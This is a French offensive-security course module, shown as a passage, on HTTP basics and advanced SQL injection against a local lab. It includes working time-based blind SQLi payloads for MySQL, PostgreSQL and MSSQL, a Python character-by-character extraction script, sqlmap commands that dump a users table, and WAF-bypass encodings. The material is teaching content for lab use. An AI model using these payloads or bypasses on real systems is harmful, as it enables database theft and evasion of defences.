# Module 2 — Injections Avancées & Rappels HTTP

**Niveau** : M2 (Red Team)  
**Durée estimée** : 6–8 heures  
**Lab** : `http://localhost:8080`  
**Tags MITRE ATT&CK** : T1190, T1059.004

---

## Table des matières

1. [Rappels HTTP essentiels](#1-rappels-http-essentiels)
2. [SQL Injection avancée (T1190)](#2-sql-injection-avancée-t1190)
3. [NoSQL Injection — MongoDB (T1190)](#3-nosql-injection--mongodb-t1190)
4. [SSTI — Server-Side Template Injection (T1190)](#4-ssti--server-side-template-injection-t1190)
5. [Command Injection (T1059.004)](#5-command-injection-t1059004)
6. [XXE — XML External Entity (T1190)](#6-xxe--xml-external-entity-t1190)
7. [TP Synthèse](#7-tp-synthèse)
8. [Annexes](#8-annexes)

---

## 1. Rappels HTTP essentiels

### 1.1 Le cycle requête / réponse

Le protocole HTTP fonctionne sur un modèle **client-serveur** sans état (stateless). Le client envoie une **requête** (request), le serveur répond par une **réponse** (response).

#### Exemple de requête HTTP brute (GET)

```http
GET /api/transactions HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Connection: close
```

#### Exemple de réponse HTTP brute

```http
HTTP/1.1 200 OK
Date: Sat, 30 May 2026 10:00:00 GMT
Server: nginx/1.24.0
Content-Type: application/json
Content-Length: 452
Connection: close

[
  {
    "id": 1,
    "user": "admin",
    "montant": 1500.00,
    "devise": "EUR"
  }
]
```

#### Anatomie d'une requête

| Élément | Description |
|---------|-------------|
| **Ligne de requête** | `METHODE /chemin HTTP/1.1` |
| **Headers** | Métadonnées (Host, User-Agent, Cookie, Content-Type…) |
| **Ligne vide** | Séparateur obligatoire (CRLF) |
| **Corps** | Données (présent pour POST, PUT, PATCH) |

#### Anatomie d'une réponse

| Élément | Description |
|---------|-------------|
| **Ligne de statut** | `HTTP/1.1 <code> <message>` (ex: `200 OK`, `401 Unauthorized`, `500 Internal Server Error`) |
| **Headers** | Server, Content-Type, Set-Cookie… |
| **Ligne vide** | Séparateur obligatoire |
| **Corps** | Contenu (HTML, JSON, XML, image…) |

---

### 1.2 Méthodes HTTP

| Méthode | Idempotent | Sécurisé | Corps | Usage |
|---------|-----------|----------|-------|-------|
| **GET** | Oui | Oui | Non | Récupérer une ressource |
| **POST** | Non | Non | Oui | Créer une ressource / soumettre un formulaire |
| **PUT** | Oui | Non | Oui | Remplacer complètement une ressource |
| **PATCH** | Non | Non | Oui | Modification partielle |
| **DELETE** | Oui | Non | Non (parfois oui) | Supprimer une ressource |
| **OPTIONS** | Oui | Oui | Non | Découvrir les méthodes autorisées |
| **HEAD** | Oui | Oui | Non | Identique à GET sans le corps |

#### Exemple d'enumeration OPTIONS

```bash
# Envoie une requête OPTIONS pour découvrir les méthodes HTTP autorisées
# -X OPTIONS : force la méthode HTTP OPTIONS
# -v : mode verbeux (affiche les headers de la requête et de la réponse)
# Le header "Allow" dans la réponse liste les méthodes autorisées
curl -X OPTIONS -v http://localhost:8080/api/
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `curl -X OPTIONS -v <URL>` | Envoie une requête OPTIONS pour découvrir les méthodes autorisées |
| `-X OPTIONS` | Spécifie la méthode HTTP OPTIONS (découverte) |
| `-v` | Mode verbeux : affiche les headers de requête et de réponse |

Réponse typique :

```http
HTTP/1.1 200 OK
Allow: GET, POST, PUT, DELETE, OPTIONS
```

---

### 1.3 Headers critiques en sécurité

#### Cookies

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Lax
```

| Attribut | Rôle |
|----------|------|
| **HttpOnly** | Interdit l'accès au cookie via JavaScript (`document.cookie`) |
| **Secure** | Cookie transmis uniquement en HTTPS |
| **SameSite** | `Strict` : jamais en cross-site ; `Lax` : sur les navigations top-level (GET) ; `None` : toujours (nécessite Secure) |

#### Headers de sécurité

| Header | Valeur exemple | Protection |
|--------|---------------|-----------|
| **Content-Security-Policy** | `default-src 'self'; script-src 'self'` | XSS, injection de contenu |
| **Strict-Transport-Security** | `max-age=31536000; includeSubDomains` | Downgrade HTTPS → HTTP |
| **X-Frame-Options** | `DENY` ou `SAMEORIGIN` | Clickjacking |
| **X-Content-Type-Options** | `nosniff` | MIME sniffing |
| **Access-Control-Allow-Origin** | `https://app.com` (CORS) | Contrôle d'accès cross-origin |

##### Contre-mesure manuelle (enumération CORS)

```bash
# Test de configuration CORS : vérifier si le serveur autorise une origine arbitraire
# -H "Origin: https://evil.com" : ajoute un header HTTP personnalisé Origin
# -I : envoie une requête HEAD (seulement les headers de réponse)
# Si la réponse contient "Access-Control-Allow-Origin: https://evil.com"
# alors le CORS est mal configuré (origine non vérifiée)
curl -H "Origin: https://evil.com" -I http://localhost:8080/api/sensitive
```
Regarder si `Access-Control-Allow-Origin: https://evil.com` (CORS mal configuré).

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `curl -H "Origin: <url>" -I <URL>` | Envoie une requête HEAD avec un header Origin personnalisé (test CORS) |
| `-H "Origin: https://evil.com"` | Ajoute un header HTTP arbitraire (ici Origin) pour tester la réflexion CORS |
| `-I` | Méthode HEAD : le serveur répond avec les headers mais sans le corps |

---

### 1.4 CSP — Content Security Policy

La CSP est un header qui restreint les sources autorisées à charger du contenu.

Exemple restrictif :

```http
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'none'
```

**Test de contournement** : si `script-src` contient `'unsafe-inline'`, les XSS classiques passent. Si des CDN comme `cdnjs.cloudflare.com` sont dans `script-src`, on peut charger un vieux framework Angular avec sandbox bypass.

---

### 1.5 CORS — Cross-Origin Resource Sharing

Mécanisme qui permet à un navigateur d'autoriser ou non les requêtes cross-origin.

**Requête préflight OPTIONS** (quand la requête est "non simple") :

```http
OPTIONS /api/transactions HTTP/1.1
Origin: https://evil.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-Custom-Header
```

**Réponse du serveur** :

```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: POST, GET
Access-Control-Allow-Credentials: true
```

Si `Access-Control-Allow-Origin: *` ET `Access-Control-Allow-Credentials: true`, le site est vulnérable à une fuite de données cross-origin.

---

### 1.6 Méthodologie de pentest web

```
┌─────────────────────────────────────────────────────┐
│ 1. RECONNAISSANCE                                   │
│    - Identification des technologies (Wappalyzer)    │
│    - Scan de ports (nmap)                            │
│    - DNS / sous-domaines (gobuster, ffuf)            │
├─────────────────────────────────────────────────────┤
│ 2. MAPPING                                          │
│    - Crawl des endpoints (gobuster, dirb)            │
│    - Cartographie des paramètres                     │
│    - Identification des points d'injection           │
├─────────────────────────────────────────────────────┤
│ 3. IDENTIFICATION                                   │
│    - Tests d'injection (SQLi, XSS, SSTI, etc.)       │
│    - Détection de version des frameworks             │
│    - Analyse des réponses (timing, erreurs, status)  │
├─────────────────────────────────────────────────────┤
│ 4. EXPLOITATION                                     │
│    - Extraction de données                           │
│    - Escalade de privilèges                          │
│    - Exécution de code (RCE)                         │
├─────────────────────────────────────────────────────┤
│ 5. POST-EXPLOITATION                                │
│    - Maintien d'accès                               │
│    - Mouvement latéral                              │
│    - Dissimulation des traces                       │
└─────────────────────────────────────────────────────┘
```

#### Commandes de reconnaissance initiale

```bash
# Scan des ports ouverts avec nmap
# -sV : détection de version des services (identifie le logiciel serveur)
# -p1-10000 : scanne les ports 1 à 10000 (plage courante pour les services web)
# localhost : cible locale (le lab tourne en local)
nmap -sV -p1-10000 localhost

# Découverte d'endpoints avec gobuster (bruteforce de répertoires)
# dir : mode "directory/file busting" (découverte de chemins)
# -u : URL cible
# -w : wordlist contenant les noms de chemins à tester
# -t 50 : 50 threads en parallèle pour accélérer le scan
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# Détection de technologies à partir des headers HTTP
# curl -sI : envoie une requête HEAD (headers uniquement), mode silencieux
# grep -iE : filtre avec regex étendue, insensible à la casse
# server : identifie le serveur web (nginx, Apache, etc.)
# x-powered-by : technologie côté serveur (PHP, Express, etc.)
# set-cookie : révèle le type de session (JSESSIONID, PHPSESSID, etc.)
curl -sI http://localhost:8080 | grep -iE 'server|x-powered-by|set-cookie'
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `nmap -sV -p1-10000 <cible>` | Scan de ports avec détection de version des services |
| `-sV` | Active la détection de version des services (banners/logiciels) |
| `-p1-10000` | Plage de ports à scanner (1 à 10000) |
| `gobuster dir -u <URL> -w <wordlist> -t <threads>` | Brute-force de répertoires/fichiers |
| `-t 50` | Nombre de threads parallèles (plus haut = plus rapide, mais plus bruyant) |
| `curl -sI <URL>` | Envoie une requête HTTP HEAD et affiche uniquement les en-têtes |
| `grep -iE 'server\|x-powered-by\|set-cookie'` | Recherche les headers révélant les technologies serveur |

---

## 2. SQL Injection avancée (T1190)

### MITRE ATT&CK

| ID | Nom | Description |
|----|-----|-------------|
| **T1190** | Exploit Public-Facing Application | L'attaquant exploite une injection SQL dans une application exposée publiquement |
| **T1505.003** | Server Software Component: Web Shell | Après extraction, dépose un webshell via INTO OUTFILE / INTO DUMPFILE |

### 2.1 Typologie des SQL Injections

| Type | Principe | Retour visible | Temps réel | Rapidité | Facilité |
|------|----------|---------------|------------|----------|----------|
| **Union-based** | UNION SELECT pour fusionner les résultats | Oui (dans la page) | Non | Très rapide | Facile |
| **Error-based** | Extraction via les messages d'erreur (double query, extractvalue) | Oui (dans l'erreur) | Non | Rapide | Facile |
| **Boolean blind** | Comparaison VRAI/FAUX via le comportement de la page | Partiel (page ≠) | Non | Lent | Moyen |
| **Time-based blind** | Inférence via des délais (SLEEP, pg_sleep, WAITFOR) | Aucun | Oui (pauses) | Très lent | Moyen |
| **Out-of-band** | Exfiltration via canal DNS/HTTP externe | Aucun | Non | Variable | Difficile |
| **Second-order** | Injection stockée, déclenchée ailleurs | Variable | Variable | Variable | Difficile |

### 2.2 Time-based blind MySQL — SLEEP

#### Payloads pour MySQL

```sql
# Test baseline : si l'injection fonctionne, SLEEP(5) suspend la requête 5 secondes
# ' OR SLEEP(5) --  : l'apostrophe ferme la chaîne SQL, OR ajoute une condition toujours vraie, -- commente la suite
' OR SLEEP(5) --
# 1' AND SLEEP(5) -- : AND attend que la condition précédente soit vraie + SLEEP 5s
1' AND SLEEP(5) --
# 1' AND IF(1=1, SLEEP(5), 0) -- : IF conditionnel, 1=1 est toujours vrai → SLEEP exécuté
1' AND IF(1=1, SLEEP(5), 0) --

# Extraction d'un caractère : tester si la version MySQL commence par '8'
# SUBSTRING((SELECT VERSION()),1,1) : extrait le 1er caractère de la version
# IF(..., SLEEP(3), 0) : si le caractère est '8', attend 3s, sinon retourne 0
1' AND IF(SUBSTRING((SELECT VERSION()),1,1)='8', SLEEP(3), 0) --

# Alternative à SLEEP : BENCHMARK exécute une expression coûteuse en CPU
# BENCHMARK(5000000, MD5('test')) : calcule MD5 5 millions de fois (consomme du temps CPU)
# Utile quand SLEEP est filtré par le WAF ou désactivé
1' AND BENCHMARK(5000000, MD5('test')) --
```

**Explication des payloads MySQL :**

| Payload | Rôle |
|---------|------|
| `' OR SLEEP(5) --` | Injection basique : SLEEP 5s si la condition est vraie |
| `1' AND SLEEP(5) --` | Avec AND : SLEEP seulement si la condition précédente est vraie |
| `1' AND IF(1=1, SLEEP(5), 0) --` | IF conditionnel : SLEEP 5s si 1=1 (toujours vrai) |
| `1' AND IF(SUBSTRING((SELECT VERSION()),1,1)='8', SLEEP(3), 0) --` | Extraction de version : teste si le 1er caractère est '8' |
| `1' AND BENCHMARK(5000000, MD5('test')) --` | Alternative CPU-intensive : exécute 5M de hash MD5 |

#### Script d'extraction caractère par caractère

# === EXÉCUTER SUR LA MACHINE ATTAQUANTE (Kali) ===
```bash
# Sauvegarder le script d'extraction SQLite time-based :
cat > sqlite_time_extract.py << 'PYEOF'
```

```python
#!/usr/bin/env python3
# Script d'extraction time-based blind SQLi pour MySQL
# Cible : http://localhost:8080/api/transactions?filter=

import requests  # Bibliothèque HTTP
import string    # Constantes de caractères
import sys

# URL de l'endpoint vulnérable (sans le paramètre filter, qui est ajouté plus tard)
TARGET = "http://localhost:8080/api/transactions"
# Durée du SLEEP en secondes quand la condition est vraie
DELAY = 3
# Timeout des requêtes : délai + 2s de marge
TIMEOUT = DELAY + 2

def inject(payload):
    """Envoie la requête avec le payload injecté dans le paramètre filter.
    Retourne True si le serveur a mis au moins DELAY secondes à répondre (condition vraie)."""
    # Le payload est passé comme valeur du paramètre "filter"
    params = {"filter": payload}
    try:
        # Requête GET avec timeout
        r = requests.get(TARGET, params=params, timeout=TIMEOUT)
        # Compare le temps écoulé avec le délai attendu
        return r.elapsed.total_seconds() >= DELAY
    except requests.exceptions.ReadTimeout:
        # Timeout de lecture → le SLEEP a probablement été exécuté
        return True
    except requests.exceptions.Timeout:
        # Timeout général → considéré comme vrai
        return True

def extract_string(query, charset=string.printable):
    """Extrait une chaîne depuis la base de données caractère par caractère.
    query : requête SQL dont on veut extraire le résultat (ex: SELECT DATABASE())
    charset : ensemble de caractères possibles à tester."""
    extracted = ""
    # Parcourt les positions de 1 à 64 (1-indexé)
    for pos in range(1, 64):
        found = False
        for c in charset:
            # Construction du payload time-based :
            # IF(SUBSTRING((query), pos, 1) = 'c', SLEEP(DELAY), 0)
            # Si le caractère à la position pos est 'c', SLEEP est exécuté
            payload = (
                f"1' AND IF(SUBSTRING(({query}),{pos},1)='{c}', SLEEP({DELAY}), 0) -- -"
            )
            if inject(payload):
                extracted += c
                print(f"[+] Position {pos} : '{c}' => extrait: {extracted}")
                found = True
                break
        if not found:
            # Aucun caractère trouvé → fin de la chaîne
            break
    return extracted

if __name__ == "__main__":
    print("[*] Extraction du nom de la base de données...")
    # SELECT DATABASE() retourne le nom de la base courante
    db_name = extract_string("SELECT DATABASE()", charset=string.ascii_lowercase + string.digits + '_')
    print(f"[+] Database : {db_name}")

    print("[*] Extraction de la version MySQL...")
    # SELECT VERSION() retourne la version complète du SGBD
    version = extract_string("SELECT VERSION()", charset=string.printable)
    print(f"[+] Version : {version}")
```

PYEOF
python3 sqlite_time_extract.py

**Explication du script :**

| Élément | Rôle/Explication |
|---------|------------------|
| `import requests` | Bibliothèque HTTP pour envoyer des requêtes GET |
| `TARGET` | URL de l'API vulnérable (sans paramètres ?) |
| `DELAY` | Durée en secondes du SLEEP pour la détection time-based |
| `TIMEOUT` | Timeout des requêtes = DELAY + 2 (marge de sécurité) |
| `inject(payload)` | Envoie le payload et détecte si un SLEEP a été exécuté |
| `r.elapsed.total_seconds()` | Temps écoulé pour la requête HTTP |
| `extract_string(query, charset)` | Extrait le résultat d'une requête SQL caractère par caractère |
| `SUBSTRING(({query}),{pos},1)` | Fonction SQL : extrait 1 caractère à la position `pos` du résultat |
| `SELECT DATABASE()` | Requête SQL retournant le nom de la base de données courante |
| `SELECT VERSION()` | Requête SQL retournant la version du serveur MySQL |

### 2.3 Time-based blind PostgreSQL — pg_sleep

#### Payloads pour PostgreSQL

```sql
-- Test baseline : vérifie si PostgreSQL est le SGBD
-- ' OR (SELECT pg_sleep(5)) IS NULL -- : pg_sleep(5) suspend 5s, retourne NULL, IS NULL = vrai
' OR (SELECT pg_sleep(5)) IS NULL --
-- 1' ; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --
-- Le ; termine la requête précédente, CASE WHEN exécute pg_sleep si 1=1 (toujours vrai)
1' ; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- Extraction de version : tester si la version PostgreSQL commence par 'P'
-- SUBSTRING((SELECT VERSION()),1,1)='P' : condition sur le 1er caractère
-- (SELECT CASE WHEN ... THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL
-- Si la condition est vraie → pg_sleep(5), sinon pg_sleep(0)
1' AND (SELECT CASE WHEN SUBSTRING((SELECT VERSION()),1,1)='P' THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL --

-- Alternative sans pg_sleep : génération de séquence (consommation CPU)
-- generate_series(1,5000000) : génère 5 millions de lignes
-- count(*) : compte les lignes (opération coûteuse qui prend du temps)
-- Peut contourner un blocage de pg_sleep
1' AND (SELECT count(*) FROM generate_series(1,5000000)) IS NOT NULL --
```

**Explication des payloads PostgreSQL :**

| Payload | Rôle |
|---------|------|
| `' OR (SELECT pg_sleep(5)) IS NULL --` | Test basique : pg_sleep suspend 5s |
| `1' ; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --` | CASE conditionnel avec ; (terminaison de requête) |
| `1' AND (SELECT CASE WHEN SUBSTRING(...)='P' THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL --` | Extraction de version : teste le 1er caractère |
| `1' AND (SELECT count(*) FROM generate_series(1,5000000)) IS NOT NULL --` | Alternative CPU : génère 5M de lignes (consommation) |

#### Variante avec requête préparée

```sql
-- Variante avec current_database() et LIKE
-- current_database() : retourne le nom de la base courante (équivalent à DATABASE())
-- LIKE 'a%' : test si le nom commence par 'a' (pattern matching)
-- CASE WHEN ... THEN pg_sleep(5) ELSE pg_sleep(0) END : exécution conditionnelle
1' AND (SELECT CASE WHEN (SELECT current_database() LIKE 'a%') THEN pg_sleep(5) ELSE pg_sleep(0) END) --
```

### 2.4 Time-based blind MSSQL — WAITFOR DELAY

#### Payloads pour MSSQL

```sql
-- Test baseline pour MSSQL
-- '; WAITFOR DELAY '0:0:5' -- : ; termine la requête, WAITFOR DELAY suspend 5s
'; WAITFOR DELAY '0:0:5' --
-- 1'; IF (1=1) WAITFOR DELAY '0:0:5' -- : IF conditionnel, 1=1 = toujours vrai
1'; IF (1=1) WAITFOR DELAY '0:0:5' --

-- Extraction de version : tester si @@version commence par 'M'
-- @@version : variable système MSSQL contenant la version
-- SUBSTRING((SELECT @@version),1,1) : 1er caractère de la version
-- IF (...) WAITFOR DELAY '0:0:5' : exécution conditionnelle du délai
1'; IF (SUBSTRING((SELECT @@version),1,1)='M') WAITFOR DELAY '0:0:5' --

-- Alternative avec CASE WHEN
-- SELECT CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0' END
-- Syntaxe alternative à IF pour l'exécution conditionnelle
1'; SELECT CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0' END --
```

**Explication des payloads MSSQL :**

| Payload | Rôle |
|---------|------|
| `'; WAITFOR DELAY '0:0:5' --` | Test basique : WAITFOR DELAY suspend 5s |
| `1'; IF (1=1) WAITFOR DELAY '0:0:5' --` | IF conditionnel avec 1=1 (toujours vrai) |
| `1'; IF (SUBSTRING((SELECT @@version),1,1)='M') WAITFOR DELAY '0:0:5' --` | Extraction de version : teste le 1er caractère |
| `1'; SELECT CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0' END --` | Alternative CASE WHEN pour condition |

---

### 2.5 TP Guidé — Exploitation SQLi time-based blind sur `/api/transactions?filter=`

#### Étape 1 : Détection

```bash
# Tester si le paramètre filter est vulnérable en envoyant une apostrophe simple
# Une apostrophe non échappée ferme la chaîne SQL et peut causer une erreur
# --max-time 10 : timeout de 10 secondes (évite d'attendre trop longtemps)
curl -s --max-time 10 "http://localhost:8080/api/transactions?filter=1'"
```

Si une erreur SQL apparaît ou une réponse différente, le point d'injection est confirmé.

```bash
# Time-based test : injecte OR SLEEP(5) pour vérifier si le serveur exécute du SQL
# %20 = espace (URL encoding), --%20- = commentaire SQL pour ignorer la suite
# time : mesure le temps d'exécution de curl
# Si la requête prend ~5 secondes, SLEEP(5) a été exécuté → injection SQL confirmée
time curl -s "http://localhost:8080/api/transactions?filter=1'%20OR%20SLEEP(5)%20--%20-"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `curl -s --max-time 10 "<URL>"` | Requête HTTP GET avec timeout de 10s |
| `filter=1'` | Test basique : une apostrophe ferme la chaîne SQL et peut générer une erreur |
| `time curl -s "<URL>"` | Mesure le temps d'exécution pour détecter un délai |
| `%20` | Encodage URL de l'espace |
| `%20--%20-` | Commentaire SQL `-- -` pour ignorer le reste de la requête originale |
| `SLEEP(5)` | Fonction MySQL qui suspend la requête 5 secondes |

**Résultat attendu** : la requête prend ~5 secondes.

#### Étape 2 : Identifier le SGBD

Utiliser les variations de syntaxe pour déterminer le type de base de données :

```bash
# Test MySQL : fonction SLEEP() spécifique à MySQL
# Si SLEEP(3) fonctionne (délai de 3s) → MySQL
curl -s --max-time 10 "http://localhost:8080/api/transactions?filter=1'%20OR%20SLEEP(3)%20--%20-"

# Test PostgreSQL : fonction pg_sleep() spécifique à PostgreSQL
# Si SLEEP() ne fonctionne pas mais pg_sleep(3) oui → PostgreSQL
# (SELECT pg_sleep(3)) : sous-requête qui retourne NULL après 3s
curl -s --max-time 10 "http://localhost:8080/api/transactions?filter=1'%20OR%20(SELECT%20pg_sleep(3))%20--%20-"

# Test MSSQL : WAITFOR DELAY spécifique à MSSQL
# %3B = ; (point-virgule) pour terminer la requête
# WAITFOR DELAY '0:0:3' : suspend 3 secondes
curl -s --max-time 10 "http://localhost:8080/api/transactions?filter=1'%3B%20WAITFOR%20DELAY%20'0:0:3'%20--%20-"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `SLEEP(3)` | Fonction MySQL : suspend 3 secondes |
| `(SELECT pg_sleep(3))` | Fonction PostgreSQL : sous-requête avec pg_sleep |
| `%3B` | Encodage URL de `;` (point-virgule, séparateur de requêtes MSSQL) |
| `WAITFOR DELAY '0:0:3'` | Commande MSSQL : suspend 3 secondes (format HH:MM:SS) |

#### Étape 3 : Extraction de la structure

```bash
# Obtenir le nombre de colonnes via ORDER BY
# ORDER BY 5 : trie par la 5e colonne (si elle existe, la requête réussit)
# Si ORDER BY 5 réussit mais ORDER BY 6 échoue → 5 colonnes
# La différence de comportement (succès/échec) permet de déterminer le nombre de colonnes
curl -s "http://localhost:8080/api/transactions?filter=1'%20ORDER%20BY%205%20--%20-"
curl -s "http://localhost:8080/api/transactions?filter=1'%20ORDER%20BY%206%20--%20-"
# Si la première échoue et la seconde aussi, c'est qu'il y a 5 colonnes
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `ORDER BY 5` | Ordonne par la 5e colonne — si elle existe, la requête réussit |
| `ORDER BY 6` | Ordonne par la 6e colonne — si elle n'existe pas, la requête échoue |

#### Étape 4 : Extraction du nom de la base

```bash
# Time-based : tester si le nom de la base de données commence par 'l'
# SUBSTRING((SELECT DATABASE()),1,1) : extrait le 1er caractère du nom de la DB
# IF(condition, SLEEP(3), 0) : si le 1er caractère est 'l', attend 3s
# En testant chaque caractère un par un, on reconstruit le nom complet de la DB
curl -s --max-time 10 "http://localhost:8080/api/transactions?filter=1'%20AND%20IF(SUBSTRING((SELECT%20DATABASE()),1,1)='l',SLEEP(3),0)%20--%20-"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `SELECT DATABASE()` | Requête SQL qui retourne le nom de la base courante |
| `SUBSTRING(...,1,1)` | Extrait le caractère à la position 1 (1-indexé) |
| `IF(cond, SLEEP(3), 0)` | Exécution conditionnelle : sleep 3s si vrai, sinon 0 |
| `'l'` | Caractère testé (on itère sur l'alphabet) |

#### Étape 5 : Automatisation avec sqlmap

```bash
# === CONFIGURATION PROXY BURP ===
# Démarrer Burp Suite, puis configurer le listener sur 127.0.0.1:8081 (pas 8080 qui est le port du lab)
export http_proxy=http://127.0.0.1:8081
export https_proxy=http://127.0.0.1:8081
# sqlmap via Burp :
sqlmap -u "http://localhost:8080/api/transactions?filter=1" --proxy=http://127.0.0.1:8081 --batch

# Lancer sqlmap sur le paramètre filter
# -u : spécifie l'URL cible avec le paramètre à tester
# --technique=T : force uniquement la technique time-based
# --batch : mode automatique (répond "oui" par défaut à toutes les questions)
# --level=3 : niveau d'intensité des tests (1-5)
# --risk=2 : niveau de risque (1-3, plus haut = payloads plus invasifs)
# --dbms=mysql : précise le SGBD pour optimiser les payloads
# -v 3 : niveau de verbosité (3 = affiche les payloads envoyés)
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
       --technique=T \
       --batch \
       --level=3 \
       --risk=2 \
       --dbms=mysql \
       -v 3
```

**Explication des flags :**

| Flag | Rôle |
|------|------|
| `-u` | URL cible |
| `--technique=T` | Utiliser uniquement la technique time-based |
| `--batch` | Mode non-interactif (réponses par défaut) |
| `--level=3` | Niveau de tests (1-5, plus haut = plus de payloads) |
| `--risk=2` | Risque (1-3, plus haut = plus destructeur) |
| `--dbms=mysql` | Forcer le SGBD cible |
| `-v 3` | Verbosité (3 = affiche les payloads) |

```bash
# Lister les bases de données disponibles
# --dbs : affiche toutes les bases de données du serveur
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
       --technique=T \
       --batch \
       --dbs

# Lister les tables de la base 'lab'
# -D lab : sélectionne la base de données "lab"
# --tables : liste toutes les tables de la base sélectionnée
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
       --technique=T \
       --batch \
       -D lab --tables

# Dump complet de la table 'users'
# -D lab -T users : cible la table "users" dans la base "lab"
# --dump : extrait et affiche toutes les données de la table
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
       --technique=T \
       --batch \
       -D lab -T users --dump
```

**Explication des flags supplémentaires :**

| Flag | Rôle |
|------|------|
| `--dbs` | Liste toutes les bases de données |
| `-D lab` | Cible la base de données "lab" |
| `--tables` | Liste les tables de la base cible |
| `-T users` | Cible la table "users" |
| `--dump` | Extrait tout le contenu de la table cible |

#### Étape 6 : Script d'extraction custom

Utiliser le script Python de la section 2.2 en adaptant le TARGET :

```bash
# Lancer le script d'extraction time-based blind SQLi
# Le script va extraire le nom de la base de données et la version MySQL
# caractère par caractère, en utilisant des délais SLEEP
python3 sqlite_time_extract.py
```

**Explication :**

| Commande | Rôle/Explication |
|----------|------------------|
| `python3 sqlite_time_extract.py` | Exécute le script Python d'extraction time-based blind SQLi |

#### Étape 7 : WAF Bypass

Si un WAF (Web Application Firewall) bloque les payloads classiques, voici des techniques de contournement :

```bash
# 1. Commentaires fragmentés /**/ : insère des commentaires SQL entre les mots-clés
# Les WAF recherchent "OR SLEEP" mais /**/OR/**/SLEEP/**/ casse le pattern
curl -s "http://localhost:8080/api/transactions?filter=1'/**/OR/**/SLEEP(3)/**/--/**/-"

# 2. Encodage alterné : utilise des caractères de contrôle encodés
# %09 = tabulation horizontale, %0A = newline, %00 = null byte
# Certains WAF ne normalisent pas ces caractères avant analyse
curl -s "http://localhost:8080/api/transactions?filter=1'%09OR%0ASLEEP(3)%00--%20-"

# 3. Case variation : mélange majuscules/minuscules dans les mots-clés
# "oR" et "SlEeP" ne sont pas reconnus par les signatures WAF simples
# MySQL est insensible à la casse pour les mots-clés SQL
curl -s "http://localhost:8080/api/transactions?filter=1'%20oR%20SlEeP(3)%20--%20-"

# 4. Doublure de caractères : OORR au lieu de OR (OORR → OR après normalisation)
# Certains WAF ne normalisent qu'une seule fois, le double OR contourne la détection
curl -s "http://localhost:8080/api/transactions?filter=1'%20OORR%20SLEEP(3)%20--%20-"

# 5. Utilisation de variables MySQL (@:=) : définit une variable utilisateur
# (@:=1) : assigne 1 à la variable utilisateur @ (toujours vrai)
# Peut contourner les WAF qui ne gèrent pas la syntaxe des variables MySQL
curl -s "http://localhost:8080/api/transactions?filter=1'%20OR%20(@%3A=1)%20OR%20SLEEP(3)%20--%20-"

# 6. Double URL encoding : %2520 = %20 = espace (décodé deux fois)
# Si le WAF décode une fois mais que le serveur décode deux fois, le payload passe
curl -s "http://localhost:8080/api/transactions?filter=1'%2520OR%2520SLEEP(3)%2520--%2520-"
```

**Explication des techniques de bypass :**

| Technique | Payload | Principe |
|-----------|---------|----------|
| Commentaires fragmentés | `/**/OR/**/SLEEP(3)/**/` | Insère des commentaires SQL entre les mots-clés pour casser les signatures WAF |
| Encodage alterné | `%09OR%0ASLEEP(3)%00` | Utilise des caractères de contrôle (tab, newline, null) rarement normalisés |
| Case variation | `oR SlEeP` | Mélange la casse : MySQL est case-insensitive, les signatures WAF souvent case-sensitive |
| Doublure de caractères | `OORR` | Double les caractères : MySQL ignore le doublon, le WAF peut être trompé |
| Variables MySQL | `(@:=1)` | Utilise une variable utilisateur MySQL comme condition toujours vraie |
| Double URL encoding | `%2520` | Encode l'encodage : le WAF décode une fois, le serveur décode deux fois |

**Techniques avancées WAF bypass :**

| Technique | Description |
|-----------|-------------|
| **HTTP Parameter Pollution** | `?filter=1'&filter=OR SLEEP(3)--` |
| **HTTP Parameter Fragmentation** | Découper le payload sur plusieurs paramètres |
| **Encodage chunked** | Transfer-Encoding: chunked avec split du payload |
| **Encodage Unicode** | Encoder certains caractères en UTF-8/UTF-16 |
| **Buffer Overflow** | Saturer le buffer du WAF `?filter=AAAAAA...<payload>` |

---

### 2.6 Outils pour SQLi

#### sqlmap — Configuration et utilisation avancée

```bash
# Installation depuis GitHub
# --depth 1 : clone seulement le dernier commit (économise bande passante)
sudo git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git /opt/sqlmap
# Crée un lien symbolique pour lancer sqlmap depuis n'importe où
ln -s /opt/sqlmap/sqlmap.py /usr/local/bin/sqlmap

# Utilisation avec un fichier de requête (Burp request file)
# -r : lit la requête depuis un fichier (copié depuis Burp Suite)
# Ce fichier contient l'URL, les headers, les cookies, le corps
sqlmap -r /tmp/request.txt --technique=T --batch

# Utilisation avec authentification (session + token Bearer)
